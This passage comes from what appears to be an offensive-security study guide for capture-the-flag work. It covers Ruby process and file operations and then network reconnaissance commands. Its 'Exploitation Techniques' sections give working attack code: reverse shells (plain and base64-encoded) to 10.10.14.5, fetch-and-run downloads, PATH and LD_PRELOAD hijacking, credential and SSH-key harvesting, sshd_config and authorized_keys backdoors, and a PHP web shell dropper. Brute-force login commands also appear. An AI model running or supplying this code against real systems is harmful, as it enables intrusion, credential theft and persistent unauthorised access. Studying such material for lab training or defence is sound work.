  puts stdout.read
  wait_thrs.each { |thr| puts "Status: #{thr.value}" }
end

# Capture only stdout
stdout, status = Open3.capture2('whoami')

# Capture only stderr
stderr, status = Open3.capture2e('command_with_errors 2>&1')
```

#### Command Injection Prevention

**Safe alternatives**:

```ruby
# BAD - vulnerable to injection
user_input = params[:file]
system("cat #{user_input}")  # Exploitable: file.txt; rm -rf /

# GOOD - array form (no shell interpretation)
system('cat', user_input)    # Safe: treats entire input as single argument

# GOOD - explicit escaping (if shell needed)
require 'shellwords'
escaped = Shellwords.escape(user_input)
system("cat #{escaped}")

# GOOD - whitelist validation
allowed_files = ['file1.txt', 'file2.txt', 'file3.txt']
if allowed_files.include?(user_input)
  system('cat', user_input)
else
  puts "Invalid file"
end
```

**Shellwords module**:

```ruby
require 'shellwords'

# Escape single argument
safe = Shellwords.escape("file with spaces & special | chars")
# => "file\\ with\\ spaces\\ \\&\\ special\\ \\|\\ chars"

# Build command array
cmd = ['find', '/tmp', '-name', user_pattern]
system(*cmd)

# Escape array of arguments
args = ['arg with spaces', 'special|chars', 'quotes"here']
escaped = Shellwords.join(args)
system("command #{escaped}")

# Split command string safely
parts = Shellwords.split('command "arg with spaces" arg2')
# => ["command", "arg with spaces", "arg2"]
```

#### Exploitation Techniques

**Reverse Shell Execution**:

```ruby
# Method 1: Direct execution
system('bash -i >& /dev/tcp/10.10.14.5/4444 0>&1')

# Method 2: Encoded payload
payload = 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
encoded = Base64.strict_encode64(payload)
system("echo #{encoded} | base64 -d | bash")

# Method 3: Staged download
system('wget http://10.10.14.5/shell.sh -O /tmp/s.sh && bash /tmp/s.sh')

# Method 4: Ruby reverse shell
require 'socket'
s = TCPSocket.new('10.10.14.5', 4444)
exec('/bin/sh -i <&3 >&3 2>&3', 3 => s)
```

**Privilege Escalation via SUID**:

```ruby
# Find SUID binaries
suid_bins = `find / -perm -4000 -type f 2>/dev/null`.split("\n")

suid_bins.each do |bin|
  puts "[+] SUID: #{bin}"
  
  # Check for exploitable binaries
  if bin.include?('nmap') || bin.include?('vim') || bin.include?('find')
    puts "[!] Potentially exploitable: #{bin}"
  end
end
```

**Environment Variable Manipulation**:

```ruby
# PATH hijacking
ENV['PATH'] = '/tmp:/usr/local/bin:/usr/bin:/bin'

# Create malicious binary
File.write('/tmp/ps', '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.5/4444 0>&1')
File.chmod(0755, '/tmp/ps')

# Trigger vulnerable script that calls 'ps' without full path
system('vulnerable_script.sh')  # Will execute /tmp/ps instead

# LD_PRELOAD exploitation
ENV['LD_PRELOAD'] = '/tmp/malicious.so'
system('/vulnerable/suid/binary')
```

### File Operations

Ruby provides extensive file manipulation capabilities essential for CTF exploitation scenarios.

#### Reading Files

**Basic read operations**:

```ruby
# Read entire file
content = File.read('/etc/passwd')

# Read with encoding
content = File.read('/etc/passwd', encoding: 'UTF-8')

# Read binary file
binary = File.read('/bin/ls', mode: 'rb')

# Read line by line (memory efficient)
File.foreach('/var/log/syslog') do |line|
  puts line if line.include?('ERROR')
end

# Read as array of lines
lines = File.readlines('/etc/passwd')
lines.each { |line| puts line }

# Read with block (auto-closes)
File.open('/etc/shadow', 'r') do |file|
  while line = file.gets
    puts line
  end
end

# Manual file handling
file = File.open('/etc/group', 'r')
content = file.read
file.close

# Read specific number of bytes
File.open('/etc/passwd', 'r') do |f|
  first_100_bytes = f.read(100)
  puts first_100_bytes
end
```

**File position control**:

```ruby
File.open('data.bin', 'rb') do |f|
  f.seek(100, IO::SEEK_SET)  # Absolute position
  data = f.read(50)           # Read 50 bytes from position 100
  
  f.rewind                    # Back to start
  
  f.seek(-20, IO::SEEK_END)   # 20 bytes before end
  
  pos = f.pos                 # Get current position
  f.pos = 0                   # Set position
end
```

#### Writing Files

**Basic write operations**:

```ruby
# Write string (overwrites)
File.write('/tmp/output.txt', 'content')

# Append mode
File.write('/tmp/log.txt', "New entry\n", mode: 'a')

# Write binary
File.write('/tmp/binary.dat', "\x00\x01\x02\xff", mode: 'wb')

# Write with block
File.open('/tmp/data.txt', 'w') do |file|
  file.puts 'Line 1'
  file.puts 'Line 2'
  file.write "No newline"
end

# Multiple writes
File.open('/tmp/test.txt', 'w') do |f|
  f << "First line\n"
  f << "Second line\n"
  f.print "Third line\n"
  f.printf "Formatted: %d\n", 42
end
```

**Atomic writes** [Inference - prevents partial writes]:

```ruby
require 'tempfile'

def atomic_write(filename, content)
  temp = Tempfile.new('atomic', File.dirname(filename))
  temp.write(content)
  temp.close
  File.rename(temp.path, filename)
end

atomic_write('/etc/config.conf', new_config_data)
```

#### File Metadata and Permissions

**File information**:

```ruby
# Check existence
File.exist?('/etc/passwd')        # true/false
File.file?('/etc/passwd')         # Is it a file?
File.directory?('/etc')           # Is it a directory?
File.symlink?('/etc/localtime')   # Is it a symlink?

# File statistics
stat = File.stat('/etc/passwd')
stat.size                         # File size in bytes
stat.mtime                        # Modification time
stat.atime                        # Access time
stat.ctime                        # Change time
stat.mode                         # Permissions (octal)
stat.uid                          # Owner UID
stat.gid                          # Owner GID

# Permissions checking
File.readable?('/etc/shadow')     # Can we read?
File.writable?('/etc/passwd')     # Can we write?
File.executable?('/bin/bash')     # Can we execute?

# Ownership
File.owned?('/tmp/myfile')        # Owned by current user?
File.grpowned?('/tmp/myfile')     # Owned by current group?

# SUID/SGID checking
File.setuid?('/usr/bin/passwd')   # Has SUID bit?
File.setgid?('/usr/bin/wall')     # Has SGID bit?

# File size

File.size('/var/log/syslog')      # Size in bytes 
File.zero?('/tmp/empty.txt')      # Is file empty?
````

**Permission modification**:
```ruby
# Change permissions (octal)
File.chmod(0644, '/tmp/file.txt')        # -rw-r--r--
File.chmod(0755, '/tmp/script.sh')       # -rwxr-xr-x
File.chmod(0600, '/tmp/secret.key')      # -rw-------
File.chmod(04755, '/tmp/suid_binary')    # -rwsr-xr-x (SUID)
File.chmod(02755, '/tmp/sgid_binary')    # -rwxr-sr-x (SGID)
File.chmod(01777, '/tmp/sticky_dir')     # drwxrwxrwt (Sticky)

# Symbolic permission changes [Inference - not directly available in Ruby]
# Use numeric modes or system calls

# Change ownership
File.chown(1000, 1000, '/tmp/file.txt')  # chown user:group
File.chown(0, 0, '/tmp/root_file')       # chown root:root

# Change only group
File.chown(nil, 1001, '/tmp/file.txt')

# Recursive operations
Dir.glob('/tmp/mydir/**/*').each do |file|
  File.chmod(0644, file) if File.file?(file)
  File.chmod(0755, file) if File.directory?(file)
end
````

**Timestamps manipulation**:

```ruby
# Change access and modification time
time = Time.new(2024, 1, 1, 12, 0, 0)
File.utime(time, time, '/tmp/file.txt')

# Set to current time
File.utime(Time.now, Time.now, '/tmp/file.txt')

# Preserve original timestamps during copy
src_stat = File.stat('/etc/passwd')
File.utime(src_stat.atime, src_stat.mtime, '/tmp/passwd_copy')
```

#### Directory Operations

**Directory traversal**:

```ruby
# List directory contents
Dir.entries('/etc')               # ['..', '.', 'passwd', 'shadow', ...]
Dir.children('/etc')              # ['passwd', 'shadow', ...] (no . or ..)

# Iterate over entries
Dir.foreach('/tmp') do |entry|
  next if entry == '.' || entry == '..'
  puts entry
end

# Glob patterns
Dir.glob('/etc/*.conf')           # All .conf files in /etc
Dir.glob('/etc/**/*.conf')        # Recursive .conf search
Dir.glob('/var/log/[as]*.log')    # Files starting with 'a' or 's'
Dir.glob('/tmp/*', File::FNM_DOTMATCH)  # Include hidden files

# Case-insensitive glob
Dir.glob('/etc/*', File::FNM_CASEFOLD)

# Find specific files
config_files = Dir.glob('/etc/**/*.{conf,cfg,ini}')
```

**Directory creation and removal**:

```ruby
# Create directory
Dir.mkdir('/tmp/mydir')
Dir.mkdir('/tmp/mydir', 0700)     # With permissions

# Create nested directories
require 'fileutils'
FileUtils.mkdir_p('/tmp/a/b/c/d')

# Remove empty directory
Dir.rmdir('/tmp/mydir')

# Remove directory recursively
FileUtils.rm_rf('/tmp/mydir')

# Change directory
Dir.chdir('/tmp')
Dir.pwd                           # Current directory

# With block (auto-return)
Dir.chdir('/etc') do
  puts Dir.pwd                    # /etc
  # Do operations
end
puts Dir.pwd                      # Original directory
```

**Directory monitoring** [Inference - requires external gems for inotify]:

```ruby
# Basic polling approach
def watch_directory(path, interval = 1)
  known_files = Dir.entries(path)
  
  loop do
    current_files = Dir.entries(path)
    new_files = current_files - known_files
    deleted_files = known_files - current_files
    
    new_files.each { |f| puts "[+] New file: #{f}" }
    deleted_files.each { |f| puts "[-] Deleted: #{f}" }
    
    known_files = current_files
    sleep interval
  end
end
```

#### FileUtils Module

Advanced file operations with error handling:

```ruby
require 'fileutils'

# Copy operations
FileUtils.cp('/etc/passwd', '/tmp/passwd')
FileUtils.cp_r('/etc/ssh', '/tmp/ssh_backup')  # Recursive copy

# Preserve attributes during copy
FileUtils.cp('/etc/passwd', '/tmp/passwd', preserve: true)

# Move/rename
FileUtils.mv('/tmp/old.txt', '/tmp/new.txt')
FileUtils.mv('/tmp/file.txt', '/var/backups/')

# Remove operations
FileUtils.rm('/tmp/file.txt')
FileUtils.rm_f('/tmp/file.txt')                # Force (no error if missing)
FileUtils.rm_rf('/tmp/directory')              # Recursive force remove

# Touch (create empty file or update timestamp)
FileUtils.touch('/tmp/marker.txt')
FileUtils.touch(['/tmp/f1.txt', '/tmp/f2.txt'])

# Create directories
FileUtils.mkdir_p('/tmp/a/b/c')                # Create parent dirs
FileUtils.makedirs('/tmp/x/y/z')               # Alias for mkdir_p

# Install (copy with permissions)
FileUtils.install('/tmp/script.sh', '/usr/local/bin/', mode: 0755)

# Compare files
FileUtils.compare_file('/etc/passwd', '/tmp/passwd')  # Returns true/false
FileUtils.identical?('/file1', '/file2')       # Alias

# Symbolic links
FileUtils.ln_s('/etc/passwd', '/tmp/passwd_link')
FileUtils.ln_sf('/new/target', '/tmp/link')    # Force overwrite existing

# Change ownership recursively
FileUtils.chown_R('www-data', 'www-data', '/var/www')

# Change permissions recursively
FileUtils.chmod_R(0644, '/tmp/files')
```

**Safe operations with verbose/noop modes**:

```ruby
# Dry-run (show what would happen without doing it)
FileUtils.rm_rf('/important/data', noop: true)

# Verbose output
FileUtils.cp_r('/src', '/dst', verbose: true)

# Combination
FileUtils.mkdir_p('/tmp/test', verbose: true, noop: true)
```

#### Path Manipulation

**File::path and File::basename operations**:

```ruby
# Path components
path = '/var/log/syslog.1.gz'
File.basename(path)               # 'syslog.1.gz'
File.basename(path, '.gz')        # 'syslog.1'
File.dirname(path)                # '/var/log'
File.extname(path)                # '.gz'

# Expand paths
File.expand_path('~/.ssh/id_rsa')           # '/home/user/.ssh/id_rsa'
File.expand_path('../etc/passwd', '/var')   # '/etc/passwd'
File.absolute_path('relative/path')         # Absolute version

# Join paths safely
File.join('/tmp', 'subdir', 'file.txt')     # '/tmp/subdir/file.txt'

# Split path
File.split('/var/log/syslog')     # ['/var/log', 'syslog']

# Real path (resolve symlinks)
File.realpath('/etc/localtime')   # '/usr/share/zoneinfo/America/New_York'

# Check if path is absolute
File.absolute_path?('/etc/passwd')          # true
File.absolute_path?('relative/path')        # false
```

**Pathname class** (object-oriented path handling):

```ruby
require 'pathname'

path = Pathname.new('/etc/passwd')
path.dirname                      # #<Pathname:/etc>
path.basename                     # #<Pathname:passwd>
path.extname                      # ""
path.exist?                       # true
path.file?                        # true
path.readable?                    # true

# Path traversal
path = Pathname.new('/var/log')
path.join('syslog')               # #<Pathname:/var/log/syslog>
path.parent                       # #<Pathname:/var>

# Iteration
Pathname.new('/etc').children.each do |child|
  puts child if child.file?
end

# Glob with Pathname
Pathname.glob('/etc/*.conf').each do |conf|
  puts conf.read
end
```

#### Temporary Files and Directories

**Tempfile usage**:

```ruby
require 'tempfile'

# Create temporary file
Tempfile.create('prefix') do |tmpfile|
  tmpfile.write('sensitive data')
  tmpfile.rewind
  puts tmpfile.read
  puts "Temp path: #{tmpfile.path}"
  # Auto-deleted on block exit
end

# Manual management
tmpfile = Tempfile.new('mytemp')
tmpfile.write('data')
tmpfile.close
tmpfile.path                      # '/tmp/mytemp20241026-12345-abcdef'
tmpfile.unlink                    # Manual deletion

# Temporary file with specific extension
tmpfile = Tempfile.new(['prefix', '.txt'])

# Custom temporary directory
tmpfile = Tempfile.new('temp', '/custom/tmpdir')
```

**Temporary directories**:

```ruby
require 'tmpdir'

# Get system temp directory
Dir.tmpdir                        # '/tmp' or system equivalent

# Create temporary directory
Dir.mktmpdir('prefix') do |dir|
  puts "Temp dir: #{dir}"
  File.write("#{dir}/file.txt", 'data')
  # Auto-deleted on block exit
end

# Manual temporary directory
tmpdir = Dir.mktmpdir
# Use directory
FileUtils.rm_rf(tmpdir)           # Manual cleanup
```

#### File Locking

**Advisory file locking**:

```ruby
# Exclusive lock (write lock)
File.open('/tmp/lockfile', 'w') do |file|
  file.flock(File::LOCK_EX)
  # Critical section - only one process can be here
  file.write('protected data')
  file.flock(File::LOCK_UN)       # Unlock (automatic on close)
end

# Non-blocking lock attempt
File.open('/tmp/resource', 'r+') do |file|
  if file.flock(File::LOCK_EX | File::LOCK_NB)
    puts "Lock acquired"
    # Do work
  else
    puts "Resource locked by another process"
  end
end

# Shared lock (read lock)
File.open('/tmp/shared', 'r') do |file|
  file.flock(File::LOCK_SH)
  # Multiple processes can hold shared lock simultaneously
  data = file.read
end
```

#### Binary File Operations

**Reading and writing binary data**:

```ruby
# Read binary file
binary = File.binread('/bin/ls')
puts "Size: #{binary.bytesize} bytes"

# Write binary data
File.binwrite('/tmp/binary.dat', "\x00\x01\x02\xFF")

# Pack and unpack binary structures
# Pack integers to binary
packed = [0x41424344, 0x45464748].pack('N*')  # Network byte order (big-endian)
File.binwrite('/tmp/packed.bin', packed)

# Unpack binary data
data = File.binread('/tmp/packed.bin')
unpacked = data.unpack('N*')                   # [1094861636, 1162233672]

# Common pack formats:
# C - unsigned 8-bit integer
# S - unsigned 16-bit integer (native endian)
# L - unsigned 32-bit integer (native endian)
# Q - unsigned 64-bit integer (native endian)
# n - unsigned 16-bit (big-endian)
# N - unsigned 32-bit (big-endian)
# v - unsigned 16-bit (little-endian)
# V - unsigned 32-bit (little-endian)
# A - ASCII string (space-padded)
# a - Binary string (null-padded)
# H - Hex string (high nibble first)
# h - Hex string (low nibble first)

# Read ELF header example
File.open('/bin/ls', 'rb') do |f|
  magic = f.read(4).unpack('C*')              # [0x7f, 0x45, 0x4c, 0x46]
  ei_class = f.read(1).unpack('C')[0]         # 1=32-bit, 2=64-bit
  ei_data = f.read(1).unpack('C')[0]          # 1=little-endian, 2=big-endian
end
```

**Hexadecimal operations**:

```ruby
# Binary to hex
binary = "\x00\x01\x02\xff"
hex = binary.unpack('H*')[0]                  # "000102ff"
hex_spaced = binary.unpack('H2 H2 H2 H2')    # ["00", "01", "02", "ff"]

# Hex to binary
binary = ['deadbeef'].pack('H*')              # "\xDE\xAD\xBE\xEF"

# Hex dump utility
def hexdump(data, width = 16)
  offset = 0
  data.bytes.each_slice(width) do |slice|
    hex = slice.map { |b| '%02x' % b }.join(' ')
    ascii = slice.map { |b| (32..126).include?(b) ? b.chr : '.' }.join
    puts '%08x  %-48s  %s' % [offset, hex, ascii]
    offset += width
  end
end

binary = File.binread('/bin/ls', 256)
hexdump(binary)
```

#### File Searching and Filtering

**Find files by content**:

```ruby
def grep_files(pattern, directory)
  results = []
  Dir.glob("#{directory}/**/*").each do |file|
    next unless File.file?(file) && File.readable?(file)
    
    begin
      File.foreach(file) do |line|
        if line.match?(pattern)
          results << { file: file, line: line.strip }
        end
      end
    rescue => e
      # Skip binary files or permission denied
    end
  end
  results
end

# Search for password patterns
matches = grep_files(/password\s*=\s*.+/i, '/var/www')
matches.each do |match|
  puts "#{match[:file]}: #{match[:line]}"
end
```

**Find files by attributes**:

```ruby
def find_suid_files(directory)
  suid_files = []
  Dir.glob("#{directory}/**/*").each do |file|
    next unless File.file?(file) && File.executable?(file)
    
    stat = File.stat(file)
    if (stat.mode & 04000) != 0  # Check SUID bit
      suid_files << {
        path: file,
        owner: stat.uid,
        mode: '%o' % stat.mode
      }
    end
  end
  suid_files
end

# Find world-writable files
def find_writable_files(directory)
  Dir.glob("#{directory}/**/*").select do |file|
    File.file?(file) && (File.stat(file).mode & 0002) != 0
  end
end

# Find recently modified files
def find_recent_files(directory, hours = 24)
  cutoff = Time.now - (hours * 3600)
  Dir.glob("#{directory}/**/*").select do |file|
    File.file?(file) && File.mtime(file) > cutoff
  end
end
```

#### Exploitation Techniques

**Credential harvesting**:

```ruby
def extract_credentials(directory)
  patterns = {
    password: /password\s*[=:]\s*['"]?([^'";\s]+)/i,
    api_key: /api[_-]?key\s*[=:]\s*['"]?([^'";\s]+)/i,
    token: /token\s*[=:]\s*['"]?([^'";\s]+)/i,
    secret: /secret\s*[=:]\s*['"]?([^'";\s]+)/i
  }
  
  credentials = []
  
  Dir.glob("#{directory}/**/*.{conf,config,ini,env,txt,php,py,rb}").each do |file|
    next unless File.readable?(file)
    
    begin
      content = File.read(file)
      patterns.each do |type, pattern|
        content.scan(pattern).each do |match|
          credentials << {
            file: file,
            type: type,
            value: match[0]
          }
        end
      end
    rescue => e
      # Skip problematic files
    end
  end
  
  credentials
end

creds = extract_credentials('/var/www')
creds.each do |cred|
  puts "[#{cred[:type]}] #{cred[:file]}: #{cred[:value]}"
end
```

**SSH key extraction**:

```ruby
def find_ssh_keys(directory = '/')
  keys = []
  
  # Private keys
  ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519'].each do |keyname|
    Dir.glob("#{directory}/**/.ssh/#{keyname}").each do |keyfile|
      if File.readable?(keyfile)
        keys << {
          type: 'private',
          path: keyfile,
          content: File.read(keyfile)
        }
      end
    end
  end
  
  # Authorized keys
  Dir.glob("#{directory}/**/.ssh/authorized_keys").each do |authfile|
    if File.readable?(authfile)
      keys << {
        type: 'authorized',
        path: authfile,
        content: File.read(authfile)
      }
    end
  end
  
  keys
end
```

**Configuration file tampering**:

```ruby
def backdoor_ssh_config(config_path = '/etc/ssh/sshd_config')
  return unless File.writable?(config_path)
  
  content = File.read(config_path)
  
  # Add backdoor configurations
  backdoor_lines = [
    'PermitRootLogin yes',
    'PasswordAuthentication yes',
    'PubkeyAuthentication yes',
    'PermitEmptyPasswords yes'
  ]
  
  backdoor_lines.each do |line|
    unless content.include?(line)
      content << "\n#{line}"
    end
  end
  
  File.write(config_path, content)
end

# Add authorized key for persistence
def add_ssh_backdoor(target_user = 'root')
  ssh_dir = "/home/#{target_user}/.ssh"
  ssh_dir = "/.ssh" if target_user == 'root'
  
  FileUtils.mkdir_p(ssh_dir, mode: 0700) unless Dir.exist?(ssh_dir)
  
  authorized_keys = "#{ssh_dir}/authorized_keys"
  backdoor_key = "ssh-rsa AAAAB3... attacker@kali"
  
  File.open(authorized_keys, 'a') do |f|
    f.puts backdoor_key
  end
  
  File.chmod(0600, authorized_keys)
end
```

**Log file analysis**:

```ruby
def analyze_logs(log_path)
  failed_logins = {}
  successful_logins = {}
  
  File.foreach(log_path) do |line|
    # SSH failed login attempts
    if line =~ /Failed password for (\w+) from ([\d.]+)/
      user, ip = $1, $2
      failed_logins[ip] ||= {}
      failed_logins[ip][user] ||= 0
      failed_logins[ip][user] += 1
    end
    
    # SSH successful logins
    if line =~ /Accepted password for (\w+) from ([\d.]+)/
      user, ip = $1, $2
      successful_logins[ip] ||= []
      successful_logins[ip] << user
    end
  end
  
  { failed: failed_logins, successful: successful_logins }
end

# Check auth logs
if File.readable?('/var/log/auth.log')
  results = analyze_logs('/var/log/auth.log')
  
  results[:failed].each do |ip, users|
    puts "[!] #{ip} - Failed attempts: #{users.values.sum}"
  end
end
```

**Web shell upload**:

```ruby
def create_web_shell(web_root, filename = 'shell.php')
  shell_path = File.join(web_root, filename)
  
  shell_code = <<~PHP
    <?php
    if(isset($_REQUEST['cmd'])){
      system($_REQUEST['cmd']);
    }
    ?>
  PHP
  
  begin
    File.write(shell_path, shell_code)
    File.chmod(0644, shell_path)
    puts "[+] Web shell created: #{shell_path}"
    puts "[+] Access: http://target/#{filename}?cmd=id"
  rescue => e
    puts "[-] Failed: #{e.message}"
  end
end

# Find writable web directories
def find_writable_web_dirs
  web_roots = [
    '/var/www/html',
    '/var/www',
    '/usr/share/nginx/html',
    '/opt/lampp/htdocs'
  ]
  
  web_roots.select do |dir|
    Dir.exist?(dir) && File.writable?(dir)
  end
end

writable = find_writable_web_dirs
writable.each { |dir| create_web_shell(dir) }
```

---

**Important Related Topics:**

- **Ruby payload encoding and obfuscation** - Techniques for evading antivirus/IDS detection
- **Ruby metaprogramming for exploit development** - Dynamic code generation and class manipulation
- **Rex library deep dive** - Metasploit's protocol and utility libraries beyond HTTP
- **Ruby C extensions for low-level exploitation** - Writing Ruby bindings for native exploits
- **Serialization vulnerabilities (Marshal, YAML)** - Exploiting Ruby deserialization flaws

---

# CAPTURE THE FLAG (CTF) STRATEGIES

## CTF Reconnaissance Phase

### Thorough Host Enumeration

**Initial Network Discovery**

```bash
# Ping sweep for live hosts
nmap -sn 10.10.10.0/24 -oA ping_sweep

# Alternative: fping for faster sweeps
fping -a -g 10.10.10.0/24 2>/dev/null

# ARP scanning (local network only)
netdiscover -r 10.10.10.0/24
arp-scan -l

# Using masscan for fast discovery
masscan -p1-65535 10.10.10.0/24 --rate=1000

# Scan for specific protocol responses
nmap -sU -p 161 10.10.10.0/24 --open  # SNMP
nmap -sU -p 137 10.10.10.0/24 --open  # NetBIOS
```

**Comprehensive Port Scanning**

```bash
# Quick scan of top 1000 ports
nmap -T4 -p- --min-rate=1000 10.10.10.100 -oA quick_scan

# Full TCP port scan
nmap -p- -T4 -v 10.10.10.100 -oN full_tcp_scan.txt

# Aggressive full scan with version detection
nmap -p- -A -T4 -v 10.10.10.100 -oA full_aggressive

# Specific port ranges
nmap -p 1-1000,3000-4000,8000-9000 10.10.10.100

# TCP SYN scan (stealthy, requires root)
sudo nmap -sS -p- 10.10.10.100

# TCP Connect scan (no root required)
nmap -sT -p- 10.10.10.100

# All TCP ports with version detection
nmap -sV -p- --version-intensity 5 10.10.10.100 -oA version_scan
```

**UDP Port Enumeration**

```bash
# Top UDP ports scan
sudo nmap -sU --top-ports 100 10.10.10.100 -oA udp_top100

# Specific UDP services
sudo nmap -sU -p 53,67,68,69,123,161,162,514,1900 10.10.10.100

# UDP scan with version detection
sudo nmap -sUV -p 161,162,514 10.10.10.100

# Combined TCP/UDP scan
sudo nmap -sS -sU -p T:80,443,U:161,162 10.10.10.100
```

**Operating System Detection**

```bash
# OS fingerprinting
sudo nmap -O 10.10.10.100 -oN os_detection.txt

# Aggressive OS detection
sudo nmap -O --osscan-guess 10.10.10.100

# OS detection with version scanning
sudo nmap -sV -O 10.10.10.100 -oA os_version_scan

# TTL-based OS identification
ping -c 1 10.10.10.100
# TTL ~64 = Linux/Unix
# TTL ~128 = Windows
# TTL ~255 = Cisco/Network Device
```

**Network Topology Mapping**

```bash
# Traceroute to identify hops
traceroute 10.10.10.100
sudo nmap --traceroute 10.10.10.100

# MTR for continuous path monitoring
mtr 10.10.10.100

# Discover network routes
ip route
netstat -rn

# Identify gateway
route -n
ip route show default
```

**Host Information Gathering**

```bash
# DNS enumeration
nslookup 10.10.10.100
dig @10.10.10.100 ANY
dig @10.10.10.100 axfr domain.com  # Zone transfer attempt

# Reverse DNS lookup
dig -x 10.10.10.100
host 10.10.10.100

# NBT/SMB name resolution
nmblookup -A 10.10.10.100
nbtscan 10.10.10.0/24

# SNMP enumeration
snmpwalk -v2c -c public 10.10.10.100
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.100
```

**Automated Host Enumeration Script**

```bash
#!/bin/bash
# host_enum.sh - Comprehensive host enumeration

TARGET=$1
OUTPUT_DIR="enum_${TARGET}"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

mkdir -p $OUTPUT_DIR
cd $OUTPUT_DIR

echo "[*] Starting enumeration of $TARGET"

# Quick port scan
echo "[*] Running quick port scan..."
nmap -p- --min-rate=1000 -oA quick_scan $TARGET

# Extract open ports
PORTS=$(grep -oP '\d+/open' quick_scan.nmap | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')

if [ -z "$PORTS" ]; then
    echo "[-] No open ports found"
    exit 1
fi

echo "[+] Open ports: $PORTS"

# Detailed scan on open ports
echo "[*] Running detailed scan on open ports..."
nmap -p$PORTS -sV -sC -A -oA detailed_scan $TARGET

# UDP scan
echo "[*] Running UDP scan..."
sudo nmap -sU --top-ports 100 -oA udp_scan $TARGET

# OS detection
echo "[*] Attempting OS detection..."
sudo nmap -O -oA os_detection $TARGET

# Script scan
echo "[*] Running vulnerability scripts..."
nmap -p$PORTS --script=vuln -oA vuln_scan $TARGET

echo "[+] Enumeration complete. Results in $OUTPUT_DIR"
```

### Service Identification

**HTTP/HTTPS Enumeration**

```bash
# Banner grabbing
curl -I http://10.10.10.100
wget --server-response --spider http://10.10.10.100

# HTTP methods enumeration
nmap -p80,443 --script http-methods 10.10.10.100

# HTTP headers analysis
curl -v http://10.10.10.100 2>&1 | grep -E '^< |^> '

# Web server identification
whatweb http://10.10.10.100
wafw00f http://10.10.10.100

# Technology detection
wappalyzer http://10.10.10.100  # Browser extension
webtech -u http://10.10.10.100

# SSL/TLS analysis
sslscan 10.10.10.100:443
testssl.sh https://10.10.10.100
nmap -p443 --script ssl-enum-ciphers 10.10.10.100

# HTTP title and headers
nmap -p80,443,8080 --script http-title,http-headers 10.10.10.100

# Virtual host discovery
gobuster vhost -u http://10.10.10.100 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Directory and File Enumeration**

```bash
# Directory brute force with gobuster
gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt

# Extended wordlist
gobuster dir -u http://10.10.10.100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,bak

# Recursive enumeration
gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt -r

# With status codes
gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt -s "200,204,301,302,307,401,403"

# Using ffuf
ffuf -u http://10.10.10.100/FUZZ -w /usr/share/wordlists/dirb/common.txt

# With extensions
ffuf -u http://10.10.10.100/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.bak

# Feroxbuster (recursive with auto-filtering)
feroxbuster -u http://10.10.10.100 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Classic dirb
dirb http://10.10.10.100 /usr/share/wordlists/dirb/common.txt

# Wfuzz with filtering
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://10.10.10.100/FUZZ
```

**SMB/NetBIOS Service Enumeration**

```bash
# SMB version detection
nmap -p445 --script smb-protocols 10.10.10.100

# SMB enumeration with enum4linux
enum4linux -a 10.10.10.100

# SMB shares enumeration
smbclient -L //10.10.10.100/ -N
smbmap -H 10.10.10.100
smbmap -H 10.10.10.100 -u null -p null

# Null session enumeration
rpcclient -U "" -N 10.10.10.100
# Inside rpcclient:
# enumdomusers
# enumdomgroups
# queryuser <RID>

# CrackMapExec for SMB
crackmapexec smb 10.10.10.100
crackmapexec smb 10.10.10.100 --shares
crackmapexec smb 10.10.10.100 -u '' -p ''

# List SMB shares with authentication
smbclient //10.10.10.100/share -U username

# Mount SMB share
mount -t cifs //10.10.10.100/share /mnt/smb -o username=user,password=pass

# SMB vulnerability scanning
nmap -p445 --script smb-vuln* 10.10.10.100
```

**FTP Service Enumeration**

```bash
# Anonymous FTP check
ftp 10.10.10.100
# Try: anonymous / anonymous

# Automated anonymous check
nmap -p21 --script ftp-anon 10.10.10.100

# FTP banner grabbing
nc -nv 10.10.10.100 21

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://10.10.10.100
ncrack -p 21 -u admin -P passwords.txt 10.10.10.100

# Download all files recursively
wget -r ftp://anonymous:anonymous@10.10.10.100/
```

**SSH Service Enumeration**

```bash
# SSH banner grabbing
nc -nv 10.10.10.100 22
telnet 10.10.10.100 22

# SSH version detection
nmap -p22 --script ssh-hostkey 10.10.10.100
nmap -p22 --script ssh2-enum-algos 10.10.10.100

# SSH user enumeration (CVE-2018-15473)
python3 ssh-user-enum.py --port 22 --userList users.txt 10.10.10.100

# SSH brute force
hydra -L users.txt -P passwords.txt ssh://10.10.10.100
medusa -h 10.10.10.100 -U users.txt -P passwords.txt -M ssh

# SSH audit
ssh-audit 10.10.10.100
```

**Database Service Enumeration**

```bash
# MySQL enumeration (port 3306)
nmap -p3306 --script mysql-info 10.10.10.100
nmap -p3306 --script mysql-enum 10.10.10.100

# MySQL connection test
mysql -h 10.10.10.100 -u root -p

# MySQL brute force
hydra -L users.txt -P passwords.txt mysql://10.10.10.100

# PostgreSQL enumeration (port 5432)
nmap -p5432 --script pgsql-brute 10.10.10.100
psql -h 10.10.10.100 -U postgres

# MSSQL enumeration (port 1433)
nmap -p1433 --script ms-sql-info 10.10.10.100
sqsh -S 10.10.10.100 -U sa -P password

# MongoDB enumeration (port 27017)
nmap -p27017 --script mongodb-info 10.10.10.100
mongo --host 10.10.10.100

# Redis enumeration (port 6379)
nmap -p6379 --script redis-info 10.10.10.100
redis-cli -h 10.10.10.100
# Try: INFO
# Try: CONFIG GET *
```

**DNS Service Enumeration**

```bash
# DNS zone transfer
dig axfr @10.10.10.100 domain.com
host -l domain.com 10.10.10.100

# DNS record enumeration
dig @10.10.10.100 domain.com ANY
dig @10.10.10.100 domain.com A
dig @10.10.10.100 domain.com MX
dig @10.10.10.100 domain.com TXT

# Subdomain brute force
